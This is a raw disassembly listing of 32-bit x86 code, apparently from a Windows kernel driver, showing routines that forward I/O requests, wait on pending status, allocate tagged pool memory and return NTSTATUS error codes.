  4061a9:	ff d6                	call   *%esi
  4061ab:	3d 03 01 00 00       	cmp    $0x103,%eax
  4061b0:	75 15                	jne    0x4061c7
  4061b2:	6a 00                	push   $0x0
  4061b4:	6a 00                	push   $0x0
  4061b6:	6a 00                	push   $0x0
  4061b8:	6a 00                	push   $0x0
  4061ba:	53                   	push   %ebx
  4061bb:	ff 15 94 71 40 00    	call   *0x407194
  4061c1:	8b 43 10             	mov    0x10(%ebx),%eax
  4061c4:	8b 40 18             	mov    0x18(%eax),%eax
  4061c7:	85 c0                	test   %eax,%eax
  4061c9:	78 3e                	js     0x406209
  4061cb:	53                   	push   %ebx
  4061cc:	e8 5f fe ff ff       	call   0x406030
  4061d1:	8b 47 18             	mov    0x18(%edi),%eax
  4061d4:	8b 77 04             	mov    0x4(%edi),%esi
  4061d7:	50                   	push   %eax
  4061d8:	8b 07                	mov    (%edi),%eax
  4061da:	6a 00                	push   $0x0
  4061dc:	ff 75 e8             	push   -0x18(%ebp)
  4061df:	8b 76 0c             	mov    0xc(%esi),%esi
  4061e2:	8b ce                	mov    %esi,%ecx
  4061e4:	50                   	push   %eax
  4061e5:	ff 15 cc 71 40 00    	call   *0x4071cc
  4061eb:	ff d6                	call   *%esi
  4061ed:	3d 03 01 00 00       	cmp    $0x103,%eax
  4061f2:	75 15                	jne    0x406209
  4061f4:	6a 00                	push   $0x0
  4061f6:	6a 00                	push   $0x0
  4061f8:	6a 00                	push   $0x0
  4061fa:	6a 00                	push   $0x0
  4061fc:	53                   	push   %ebx
  4061fd:	ff 15 94 71 40 00    	call   *0x407194
  406203:	8b 43 10             	mov    0x10(%ebx),%eax
  406206:	8b 40 18             	mov    0x18(%eax),%eax
  406209:	5e                   	pop    %esi
  40620a:	5b                   	pop    %ebx
  40620b:	5f                   	pop    %edi
  40620c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40620f:	33 cd                	xor    %ebp,%ecx
  406211:	e8 60 0a 00 00       	call   0x406c76
  406216:	8b e5                	mov    %ebp,%esp
  406218:	5d                   	pop    %ebp
  406219:	c2 08 00             	ret    $0x8
  40621c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40621f:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  406224:	33 cd                	xor    %ebp,%ecx
  406226:	5f                   	pop    %edi
  406227:	e8 4a 0a 00 00       	call   0x406c76
  40622c:	8b e5                	mov    %ebp,%esp
  40622e:	5d                   	pop    %ebp
  40622f:	c2 08 00             	ret    $0x8
  406232:	cc                   	int3
  406233:	cc                   	int3
  406234:	cc                   	int3
  406235:	cc                   	int3
  406236:	cc                   	int3
  406237:	cc                   	int3
  406238:	cc                   	int3
  406239:	cc                   	int3
  40623a:	cc                   	int3
  40623b:	cc                   	int3
  40623c:	cc                   	int3
  40623d:	cc                   	int3
  40623e:	cc                   	int3
  40623f:	cc                   	int3
  406240:	55                   	push   %ebp
  406241:	8b ec                	mov    %esp,%ebp
  406243:	6a 02                	push   $0x2
  406245:	ff 75 14             	push   0x14(%ebp)
  406248:	ff 75 10             	push   0x10(%ebp)
  40624b:	ff 75 0c             	push   0xc(%ebp)
  40624e:	ff 75 08             	push   0x8(%ebp)
  406251:	e8 0a 00 00 00       	call   0x406260
  406256:	5d                   	pop    %ebp
  406257:	c2 10 00             	ret    $0x10
  40625a:	cc                   	int3
  40625b:	cc                   	int3
  40625c:	cc                   	int3
  40625d:	cc                   	int3
  40625e:	cc                   	int3
  40625f:	cc                   	int3
  406260:	55                   	push   %ebp
  406261:	8b ec                	mov    %esp,%ebp
  406263:	57                   	push   %edi
  406264:	68 7a 63 64 76       	push   $0x7664637a
  406269:	6a 1c                	push   $0x1c
  40626b:	6a 01                	push   $0x1
  40626d:	ff 15 f4 70 40 00    	call   *0x4070f4
  406273:	8b f8                	mov    %eax,%edi
  406275:	85 ff                	test   %edi,%edi
  406277:	0f 84 8a 00 00 00    	je     0x406307
  40627d:	57                   	push   %edi
  40627e:	ff 15 c8 70 40 00    	call   *0x4070c8
  406284:	84 c0                	test   %al,%al
  406286:	74 7f                	je     0x406307
  406288:	53                   	push   %ebx
  406289:	8d 5f 08             	lea    0x8(%edi),%ebx
  40628c:	53                   	push   %ebx
  40628d:	e8 2e fd ff ff       	call   0x405fc0
  406292:	85 c0                	test   %eax,%eax
  406294:	78 6b                	js     0x406301
  406296:	8b 47 18             	mov    0x18(%edi),%eax
  406299:	56                   	push   %esi
  40629a:	50                   	push   %eax
  40629b:	a1 c8 0b 41 00       	mov    0x410bc8,%eax
  4062a0:	6a 00                	push   $0x0
  4062a2:	6a 00                	push   $0x0
  4062a4:	6a 00                	push   $0x0
  4062a6:	6a 00                	push   $0x0
  4062a8:	6a 00                	push   $0x0
  4062aa:	ff 75 18             	push   0x18(%ebp)
  4062ad:	ff 75 14             	push   0x14(%ebp)
  4062b0:	ff 75 10             	push   0x10(%ebp)
  4062b3:	ff 75 0c             	push   0xc(%ebp)
  4062b6:	50                   	push   %eax
  4062b7:	a1 cc 0b 41 00       	mov    0x410bcc,%eax
  4062bc:	8b 70 04             	mov    0x4(%eax),%esi
  4062bf:	8b ce                	mov    %esi,%ecx
  4062c1:	ff 15 cc 71 40 00    	call   *0x4071cc
  4062c7:	ff d6                	call   *%esi
  4062c9:	8b c8                	mov    %eax,%ecx
  4062cb:	5e                   	pop    %esi
  4062cc:	81 f9 03 01 00 00    	cmp    $0x103,%ecx
  4062d2:	75 15                	jne    0x4062e9
  4062d4:	6a 00                	push   $0x0
  4062d6:	6a 00                	push   $0x0
  4062d8:	6a 00                	push   $0x0
  4062da:	6a 00                	push   $0x0
  4062dc:	53                   	push   %ebx
  4062dd:	ff 15 94 71 40 00    	call   *0x407194
  4062e3:	8b 43 10             	mov    0x10(%ebx),%eax
  4062e6:	8b 48 18             	mov    0x18(%eax),%ecx
  4062e9:	85 c9                	test   %ecx,%ecx
  4062eb:	78 12                	js     0x4062ff
  4062ed:	8b 47 18             	mov    0x18(%edi),%eax
  4062f0:	8b 40 1c             	mov    0x1c(%eax),%eax
  4062f3:	89 07                	mov    %eax,(%edi)
  4062f5:	8b 00                	mov    (%eax),%eax
  4062f7:	89 47 04             	mov    %eax,0x4(%edi)
  4062fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4062fd:	89 38                	mov    %edi,(%eax)
  4062ff:	8b c1                	mov    %ecx,%eax
  406301:	5b                   	pop    %ebx
  406302:	5f                   	pop    %edi
  406303:	5d                   	pop    %ebp
  406304:	c2 14 00             	ret    $0x14
  406307:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  40630c:	5f                   	pop    %edi
  40630d:	5d                   	pop    %ebp
  40630e:	c2 14 00             	ret    $0x14
  406311:	cc                   	int3
  406312:	cc                   	int3
  406313:	cc                   	int3
  406314:	cc                   	int3
  406315:	cc                   	int3
  406316:	cc                   	int3
  406317:	cc                   	int3
  406318:	cc                   	int3
  406319:	cc                   	int3
  40631a:	cc                   	int3
  40631b:	cc                   	int3
  40631c:	cc                   	int3
  40631d:	cc                   	int3
  40631e:	cc                   	int3
  40631f:	cc                   	int3
  406320:	68 b8 0b 41 00       	push   $0x410bb8
  406325:	e8 3f 09 00 00       	call   0x406c69
  40632a:	68 b8 0b 41 00       	push   $0x410bb8
  40632f:	e8 3b 09 00 00       	call   0x406c6f
  406334:	c3                   	ret
  406335:	cc                   	int3
  406336:	cc                   	int3
  406337:	cc                   	int3
  406338:	cc                   	int3
  406339:	cc                   	int3
  40633a:	cc                   	int3
  40633b:	cc                   	int3
  40633c:	cc                   	int3
  40633d:	cc                   	int3
  40633e:	cc                   	int3
  40633f:	cc                   	int3
  406340:	55                   	push   %ebp
  406341:	8b ec                	mov    %esp,%ebp
  406343:	a1 c8 0b 41 00       	mov    0x410bc8,%eax
  406348:	56                   	push   %esi
  406349:	ff 75 08             	push   0x8(%ebp)
  40634c:	50                   	push   %eax
  40634d:	a1 cc 0b 41 00       	mov    0x410bcc,%eax
  406352:	8b 70 14             	mov    0x14(%eax),%esi
  406355:	8b ce                	mov    %esi,%ecx
  406357:	ff 15 cc 71 40 00    	call   *0x4071cc
  40635d:	ff d6                	call   *%esi
  40635f:	5e                   	pop    %esi
  406360:	5d                   	pop    %ebp
  406361:	c2 04 00             	ret    $0x4
  406364:	cc                   	int3
  406365:	cc                   	int3
  406366:	cc                   	int3
  406367:	cc                   	int3
  406368:	cc                   	int3
  406369:	cc                   	int3
  40636a:	cc                   	int3
  40636b:	cc                   	int3
  40636c:	cc                   	int3
  40636d:	cc                   	int3
  40636e:	cc                   	int3
  40636f:	cc                   	int3
  406370:	55                   	push   %ebp
  406371:	8b ec                	mov    %esp,%ebp
  406373:	83 ec 14             	sub    $0x14,%esp
  406376:	6a 00                	push   $0x0
  406378:	6a 01                	push   $0x1
  40637a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40637d:	50                   	push   %eax
  40637e:	ff 15 9c 71 40 00    	call   *0x40719c
  406384:	6a 00                	push   $0x0
  406386:	6a 01                	push   $0x1
  406388:	ff 15 8c 71 40 00    	call   *0x40718c
  40638e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406391:	85 c0                	test   %eax,%eax
  406393:	0f 84 89 00 00 00    	je     0x406422
  406399:	8b 40 60             	mov    0x60(%eax),%eax
  40639c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40639f:	56                   	push   %esi
  4063a0:	89 48 fc             	mov    %ecx,-0x4(%eax)
  4063a3:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  4063aa:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  4063ae:	ff 75 fc             	push   -0x4(%ebp)
  4063b1:	a1 c8 0b 41 00       	mov    0x410bc8,%eax
  4063b6:	6a 00                	push   $0x0
  4063b8:	6a 00                	push   $0x0
  4063ba:	ff 75 14             	push   0x14(%ebp)
  4063bd:	ff 75 10             	push   0x10(%ebp)
  4063c0:	6a 00                	push   $0x0
  4063c2:	6a 00                	push   $0x0
  4063c4:	ff 75 0c             	push   0xc(%ebp)
  4063c7:	ff 75 08             	push   0x8(%ebp)
  4063ca:	50                   	push   %eax
  4063cb:	a1 cc 0b 41 00       	mov    0x410bcc,%eax
  4063d0:	8b 70 10             	mov    0x10(%eax),%esi
  4063d3:	8b ce                	mov    %esi,%ecx
  4063d5:	ff 15 cc 71 40 00    	call   *0x4071cc
  4063db:	ff d6                	call   *%esi
  4063dd:	8b f0                	mov    %eax,%esi
  4063df:	81 fe 03 01 00 00    	cmp    $0x103,%esi
  4063e5:	75 28                	jne    0x40640f
  4063e7:	6a 00                	push   $0x0
  4063e9:	6a 00                	push   $0x0
  4063eb:	6a 00                	push   $0x0
  4063ed:	6a 00                	push   $0x0
  4063ef:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4063f2:	50                   	push   %eax
  4063f3:	ff 15 94 71 40 00    	call   *0x407194
  4063f9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063fc:	50                   	push   %eax
  4063fd:	8b 70 18             	mov    0x18(%eax),%esi
  406400:	ff 15 80 70 40 00    	call   *0x407080
  406406:	8b c6                	mov    %esi,%eax
  406408:	5e                   	pop    %esi
  406409:	8b e5                	mov    %ebp,%esp
  40640b:	5d                   	pop    %ebp
  40640c:	c2 10 00             	ret    $0x10
  40640f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406412:	50                   	push   %eax
  406413:	ff 15 80 70 40 00    	call   *0x407080
  406419:	8b c6                	mov    %esi,%eax
  40641b:	5e                   	pop    %esi
  40641c:	8b e5                	mov    %ebp,%esp
  40641e:	5d                   	pop    %ebp
  40641f:	c2 10 00             	ret    $0x10
  406422:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  406427:	8b e5                	mov    %ebp,%esp
  406429:	5d                   	pop    %ebp
  40642a:	c2 10 00             	ret    $0x10
  40642d:	cc                   	int3
  40642e:	cc                   	int3
  40642f:	cc                   	int3
  406430:	55                   	push   %ebp
  406431:	8b ec                	mov    %esp,%ebp
  406433:	83 ec 08             	sub    $0x8,%esp
  406436:	68 b8 0b 41 00       	push   $0x410bb8
  40643b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40643e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  406445:	50                   	push   %eax
  406446:	c7 45 fc 8c a7 40 00 	movl   $0x40a78c,-0x4(%ebp)
  40644d:	e8 0b 08 00 00       	call   0x406c5d
  406452:	85 c0                	test   %eax,%eax
  406454:	78 11                	js     0x406467
  406456:	68 c8 0b 41 00       	push   $0x410bc8
  40645b:	6a ff                	push   $0xffffffff
  40645d:	68 b8 0b 41 00       	push   $0x410bb8
  406462:	e8 fc 07 00 00       	call   0x406c63
  406467:	8b e5                	mov    %ebp,%esp
  406469:	5d                   	pop    %ebp
  40646a:	c3                   	ret
  40646b:	cc                   	int3
  40646c:	cc                   	int3
  40646d:	cc                   	int3
  40646e:	cc                   	int3
  40646f:	cc                   	int3
  406470:	55                   	push   %ebp
  406471:	8b ec                	mov    %esp,%ebp
  406473:	56                   	push   %esi
  406474:	8b 75 08             	mov    0x8(%ebp),%esi
  406477:	85 f6                	test   %esi,%esi
  406479:	74 21                	je     0x40649c
  40647b:	56                   	push   %esi
  40647c:	ff 15 c8 70 40 00    	call   *0x4070c8
  406482:	84 c0                	test   %al,%al
  406484:	74 16                	je     0x40649c
  406486:	6a 00                	push   $0x0
  406488:	ff 75 14             	push   0x14(%ebp)
  40648b:	ff 75 10             	push   0x10(%ebp)
  40648e:	ff 75 0c             	push   0xc(%ebp)
  406491:	56                   	push   %esi
  406492:	e8 39 00 00 00       	call   0x4064d0
  406497:	5e                   	pop    %esi
  406498:	5d                   	pop    %ebp
  406499:	c2 10 00             	ret    $0x10
  40649c:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4064a1:	5e                   	pop    %esi
  4064a2:	5d                   	pop    %ebp
  4064a3:	c2 10 00             	ret    $0x10
  4064a6:	cc                   	int3
  4064a7:	cc                   	int3
  4064a8:	cc                   	int3
  4064a9:	cc                   	int3
  4064aa:	cc                   	int3
  4064ab:	cc                   	int3
  4064ac:	cc                   	int3
  4064ad:	cc                   	int3
  4064ae:	cc                   	int3
  4064af:	cc                   	int3
  4064b0:	55                   	push   %ebp
  4064b1:	8b ec                	mov    %esp,%ebp
  4064b3:	6a 01                	push   $0x1
  4064b5:	ff 75 14             	push   0x14(%ebp)
  4064b8:	ff 75 10             	push   0x10(%ebp)
  4064bb:	ff 75 0c             	push   0xc(%ebp)
  4064be:	ff 75 08             	push   0x8(%ebp)
  4064c1:	e8 0a 00 00 00       	call   0x4064d0
  4064c6:	5d                   	pop    %ebp
  4064c7:	c2 10 00             	ret    $0x10
  4064ca:	cc                   	int3
  4064cb:	cc                   	int3
  4064cc:	cc                   	int3
  4064cd:	cc                   	int3
  4064ce:	cc                   	int3
  4064cf:	cc                   	int3
  4064d0:	55                   	push   %ebp
  4064d1:	8b ec                	mov    %esp,%ebp
  4064d3:	6a fe                	push   $0xfffffffe
  4064d5:	68 d8 75 40 00       	push   $0x4075d8
  4064da:	68 80 69 40 00       	push   $0x406980
  4064df:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4064e5:	50                   	push   %eax
  4064e6:	83 ec 14             	sub    $0x14,%esp
  4064e9:	53                   	push   %ebx
  4064ea:	56                   	push   %esi
  4064eb:	57                   	push   %edi
  4064ec:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  4064f1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  4064f4:	33 c5                	xor    %ebp,%eax
  4064f6:	50                   	push   %eax
  4064f7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4064fa:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  406500:	89 65 e8             	mov    %esp,-0x18(%ebp)
  406503:	8b 7d 08             	mov    0x8(%ebp),%edi
  406506:	85 ff                	test   %edi,%edi
  406508:	0f 84 2a 01 00 00    	je     0x406638
  40650e:	57                   	push   %edi
  40650f:	ff 15 c8 70 40 00    	call   *0x4070c8
  406515:	84 c0                	test   %al,%al
  406517:	0f 84 1b 01 00 00    	je     0x406638
  40651d:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  406524:	8b 45 10             	mov    0x10(%ebp),%eax
  406527:	8b 00                	mov    (%eax),%eax
  406529:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40652c:	6a 00                	push   $0x0
  40652e:	6a 00                	push   $0x0
  406530:	6a 00                	push   $0x0
  406532:	50                   	push   %eax
  406533:	ff 75 0c             	push   0xc(%ebp)
  406536:	ff 15 80 71 40 00    	call   *0x407180
  40653c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40653f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406546:	6a 01                	push   $0x1
  406548:	6a 00                	push   $0x0
  40654a:	50                   	push   %eax
  40654b:	ff 15 78 71 40 00    	call   *0x407178
  406551:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406558:	8d 5f 08             	lea    0x8(%edi),%ebx
  40655b:	53                   	push   %ebx
  40655c:	ff 15 14 71 40 00    	call   *0x407114
  406562:	68 01 00 00 c0       	push   $0xc0000001
  406567:	8b 43 10             	mov    0x10(%ebx),%eax
  40656a:	50                   	push   %eax
  40656b:	ff 15 88 71 40 00    	call   *0x407188
  406571:	8b 43 10             	mov    0x10(%ebx),%eax
  406574:	8b 40 60             	mov    0x60(%eax),%eax
  406577:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  40657e:	89 58 fc             	mov    %ebx,-0x4(%eax)
  406581:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  406585:	8b 77 04             	mov    0x4(%edi),%esi
  406588:	8b 47 18             	mov    0x18(%edi),%eax
  40658b:	8b 0f                	mov    (%edi),%ecx
  40658d:	50                   	push   %eax
  40658e:	ff 75 14             	push   0x14(%ebp)
  406591:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406594:	50                   	push   %eax
  406595:	51                   	push   %ecx
  406596:	80 7d 18 00          	cmpb   $0x0,0x18(%ebp)
  40659a:	74 05                	je     0x4065a1
  40659c:	8b 76 18             	mov    0x18(%esi),%esi
  40659f:	eb 03                	jmp    0x4065a4
  4065a1:	8b 76 1c             	mov    0x1c(%esi),%esi
  4065a4:	8b ce                	mov    %esi,%ecx
  4065a6:	ff 15 cc 71 40 00    	call   *0x4071cc
  4065ac:	ff d6                	call   *%esi
  4065ae:	8b f0                	mov    %eax,%esi
  4065b0:	81 fe 03 01 00 00    	cmp    $0x103,%esi
  4065b6:	75 15                	jne    0x4065cd
  4065b8:	6a 00                	push   $0x0
  4065ba:	6a 00                	push   $0x0
  4065bc:	6a 00                	push   $0x0
  4065be:	6a 00                	push   $0x0
  4065c0:	53                   	push   %ebx
  4065c1:	ff 15 94 71 40 00    	call   *0x407194
  4065c7:	8b 43 10             	mov    0x10(%ebx),%eax
  4065ca:	8b 70 18             	mov    0x18(%eax),%esi
  4065cd:	85 f6                	test   %esi,%esi
  4065cf:	78 0b                	js     0x4065dc
  4065d1:	8b 47 18             	mov    0x18(%edi),%eax
  4065d4:	8b 40 1c             	mov    0x1c(%eax),%eax
  4065d7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4065da:	89 01                	mov    %eax,(%ecx)
  4065dc:	ff 75 dc             	push   -0x24(%ebp)
  4065df:	ff 15 7c 71 40 00    	call   *0x40717c
  4065e5:	ff 75 dc             	push   -0x24(%ebp)
  4065e8:	ff 15 84 71 40 00    	call   *0x407184
  4065ee:	8b c6                	mov    %esi,%eax
  4065f0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4065f3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4065fa:	59                   	pop    %ecx
  4065fb:	5f                   	pop    %edi
  4065fc:	5e                   	pop    %esi
  4065fd:	5b                   	pop    %ebx
  4065fe:	8b e5                	mov    %ebp,%esp
  406600:	5d                   	pop    %ebp
  406601:	c2 14 00             	ret    $0x14
  406604:	b8 01 00 00 00       	mov    $0x1,%eax
  406609:	c3                   	ret
  40660a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40660d:	be 05 00 00 c0       	mov    $0xc0000005,%esi
  406612:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406619:	ff 75 dc             	push   -0x24(%ebp)
  40661c:	ff 15 84 71 40 00    	call   *0x407184
  406622:	8b c6                	mov    %esi,%eax
  406624:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406627:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40662e:	59                   	pop    %ecx
  40662f:	5f                   	pop    %edi
  406630:	5e                   	pop    %esi
  406631:	5b                   	pop    %ebx
  406632:	8b e5                	mov    %ebp,%esp
  406634:	5d                   	pop    %ebp
  406635:	c2 14 00             	ret    $0x14
  406638:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  40663d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406640:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406647:	59                   	pop    %ecx
  406648:	5f                   	pop    %edi
  406649:	5e                   	pop    %esi
  40664a:	5b                   	pop    %ebx
  40664b:	8b e5                	mov    %ebp,%esp
  40664d:	5d                   	pop    %ebp
  40664e:	c2 14 00             	ret    $0x14
  406651:	cc                   	int3
  406652:	cc                   	int3
  406653:	cc                   	int3
  406654:	cc                   	int3
  406655:	cc                   	int3
  406656:	cc                   	int3
  406657:	cc                   	int3
  406658:	cc                   	int3
  406659:	cc                   	int3
  40665a:	cc                   	int3
  40665b:	cc                   	int3
  40665c:	cc                   	int3
  40665d:	cc                   	int3
  40665e:	cc                   	int3
  40665f:	cc                   	int3
  406660:	55                   	push   %ebp
  406661:	8b ec                	mov    %esp,%ebp
  406663:	57                   	push   %edi
  406664:	8b 7d 08             	mov    0x8(%ebp),%edi
  406667:	85 ff                	test   %edi,%edi
  406669:	0f 84 87 00 00 00    	je     0x4066f6
  40666f:	57                   	push   %edi
  406670:	ff 15 c8 70 40 00    	call   *0x4070c8
  406676:	84 c0                	test   %al,%al
  406678:	74 7c                	je     0x4066f6
  40667a:	53                   	push   %ebx
  40667b:	56                   	push   %esi
  40667c:	8d 5f 08             	lea    0x8(%edi),%ebx
  40667f:	53                   	push   %ebx
  406680:	ff 15 14 71 40 00    	call   *0x407114
  406686:	8b 43 10             	mov    0x10(%ebx),%eax
  406689:	68 01 00 00 c0       	push   $0xc0000001
  40668e:	50                   	push   %eax
  40668f:	ff 15 88 71 40 00    	call   *0x407188
  406695:	8b 43 10             	mov    0x10(%ebx),%eax
  406698:	8b 40 60             	mov    0x60(%eax),%eax
  40669b:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  4066a2:	89 58 fc             	mov    %ebx,-0x4(%eax)
  4066a5:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  4066a9:	8b 47 18             	mov    0x18(%edi),%eax
  4066ac:	8b 77 04             	mov    0x4(%edi),%esi
  4066af:	50                   	push   %eax
  4066b0:	8b 07                	mov    (%edi),%eax
  4066b2:	6a 00                	push   $0x0
  4066b4:	8b 36                	mov    (%esi),%esi
  4066b6:	8b ce                	mov    %esi,%ecx
  4066b8:	6a 00                	push   $0x0
  4066ba:	6a 00                	push   $0x0
  4066bc:	ff 75 14             	push   0x14(%ebp)
  4066bf:	ff 75 18             	push   0x18(%ebp)
  4066c2:	ff 75 0c             	push   0xc(%ebp)
  4066c5:	ff 75 10             	push   0x10(%ebp)
  4066c8:	6a 00                	push   $0x0
  4066ca:	50                   	push   %eax
  4066cb:	ff 15 cc 71 40 00    	call   *0x4071cc
  4066d1:	ff d6                	call   *%esi
  4066d3:	3d 03 01 00 00       	cmp    $0x103,%eax
  4066d8:	75 15                	jne    0x4066ef
  4066da:	6a 00                	push   $0x0
  4066dc:	6a 00                	push   $0x0
  4066de:	6a 00                	push   $0x0
  4066e0:	6a 00                	push   $0x0
  4066e2:	53                   	push   %ebx
  4066e3:	ff 15 94 71 40 00    	call   *0x407194
  4066e9:	8b 43 10             	mov    0x10(%ebx),%eax
  4066ec:	8b 40 18             	mov    0x18(%eax),%eax
  4066ef:	5e                   	pop    %esi
  4066f0:	5b                   	pop    %ebx
  4066f1:	5f                   	pop    %edi
  4066f2:	5d                   	pop    %ebp
  4066f3:	c2 14 00             	ret    $0x14
  4066f6:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4066fb:	5f                   	pop    %edi
  4066fc:	5d                   	pop    %ebp
  4066fd:	c2 14 00             	ret    $0x14
  406700:	55                   	push   %ebp
  406701:	8b ec                	mov    %esp,%ebp
  406703:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406707:	53                   	push   %ebx
  406708:	56                   	push   %esi
  406709:	57                   	push   %edi
  40670a:	8b f1                	mov    %ecx,%esi
  40670c:	74 5c                	je     0x40676a
  40670e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406711:	85 ff                	test   %edi,%edi
  406713:	74 55                	je     0x40676a
  406715:	8b 1e                	mov    (%esi),%ebx
  406717:	85 db                	test   %ebx,%ebx
  406719:	74 4f                	je     0x40676a
  40671b:	8b 56 08             	mov    0x8(%esi),%edx
  40671e:	85 d2                	test   %edx,%edx
  406720:	74 48                	je     0x40676a
  406722:	8b 4e 04             	mov    0x4(%esi),%ecx
  406725:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  406728:	3b c2                	cmp    %edx,%eax
  40672a:	76 22                	jbe    0x40674e
  40672c:	8d 64 24 00          	lea    0x0(%esp),%esp
  406730:	8d 04 51             	lea    (%ecx,%edx,2),%eax
  406733:	8b ce                	mov    %esi,%ecx
  406735:	50                   	push   %eax
  406736:	e8 a5 00 00 00       	call   0x4067e0
  40673b:	84 c0                	test   %al,%al
  40673d:	74 2b                	je     0x40676a
  40673f:	8b 4e 04             	mov    0x4(%esi),%ecx
  406742:	8b 56 08             	mov    0x8(%esi),%edx
  406745:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  406748:	3b c2                	cmp    %edx,%eax
  40674a:	77 e4                	ja     0x406730
  40674c:	8b 1e                	mov    (%esi),%ebx
  40674e:	57                   	push   %edi
  40674f:	ff 75 08             	push   0x8(%ebp)
  406752:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  406755:	50                   	push   %eax
  406756:	e8 6f 01 00 00       	call   0x4068ca
  40675b:	83 c4 0c             	add    $0xc,%esp
  40675e:	b0 01                	mov    $0x1,%al
  406760:	01 7e 04             	add    %edi,0x4(%esi)
  406763:	5f                   	pop    %edi
  406764:	5e                   	pop    %esi
  406765:	5b                   	pop    %ebx
  406766:	5d                   	pop    %ebp
  406767:	c2 08 00             	ret    $0x8
  40676a:	5f                   	pop    %edi
  40676b:	5e                   	pop    %esi
  40676c:	32 c0                	xor    %al,%al
  40676e:	5b                   	pop    %ebx
  40676f:	5d                   	pop    %ebp
  406770:	c2 08 00             	ret    $0x8
  406773:	cc                   	int3
  406774:	cc                   	int3
  406775:	cc                   	int3
  406776:	cc                   	int3
  406777:	cc                   	int3
  406778:	cc                   	int3
  406779:	cc                   	int3
  40677a:	cc                   	int3
  40677b:	cc                   	int3
  40677c:	cc                   	int3
  40677d:	cc                   	int3
  40677e:	cc                   	int3
  40677f:	cc                   	int3
  406780:	8b 01                	mov    (%ecx),%eax
  406782:	c3                   	ret
  406783:	cc                   	int3
  406784:	cc                   	int3
  406785:	cc                   	int3
  406786:	cc                   	int3
  406787:	cc                   	int3
  406788:	cc                   	int3
  406789:	cc                   	int3
  40678a:	cc                   	int3
  40678b:	cc                   	int3
  40678c:	cc                   	int3
  40678d:	cc                   	int3
  40678e:	cc                   	int3
  40678f:	cc                   	int3
  406790:	83 39 00             	cmpl   $0x0,(%ecx)
  406793:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40679a:	74 09                	je     0x4067a5
  40679c:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  4067a0:	76 03                	jbe    0x4067a5
  4067a2:	b0 01                	mov    $0x1,%al
  4067a4:	c3                   	ret
  4067a5:	32 c0                	xor    %al,%al
  4067a7:	c3                   	ret
  4067a8:	cc                   	int3
  4067a9:	cc                   	int3
  4067aa:	cc                   	int3
  4067ab:	cc                   	int3
  4067ac:	cc                   	int3
  4067ad:	cc                   	int3
  4067ae:	cc                   	int3
  4067af:	cc                   	int3
  4067b0:	56                   	push   %esi
  4067b1:	8b f1                	mov    %ecx,%esi
  4067b3:	8b 06                	mov    (%esi),%eax
  4067b5:	85 c0                	test   %eax,%eax
  4067b7:	74 0c                	je     0x4067c5
  4067b9:	68 51 61 78 58       	push   $0x58786151
  4067be:	50                   	push   %eax
  4067bf:	ff 15 ac 71 40 00    	call   *0x4071ac
  4067c5:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4067cc:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4067d3:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4067d9:	5e                   	pop    %esi
  4067da:	c3                   	ret
  4067db:	cc                   	int3
  4067dc:	cc                   	int3
  4067dd:	cc                   	int3
  4067de:	cc                   	int3
  4067df:	cc                   	int3
  4067e0:	55                   	push   %ebp
  4067e1:	8b ec                	mov    %esp,%ebp
  4067e3:	53                   	push   %ebx
  4067e4:	56                   	push   %esi
  4067e5:	8b f1                	mov    %ecx,%esi
  4067e7:	33 db                	xor    %ebx,%ebx
  4067e9:	57                   	push   %edi
  4067ea:	33 ff                	xor    %edi,%edi
  4067ec:	8b 06                	mov    (%esi),%eax
  4067ee:	85 c0                	test   %eax,%eax
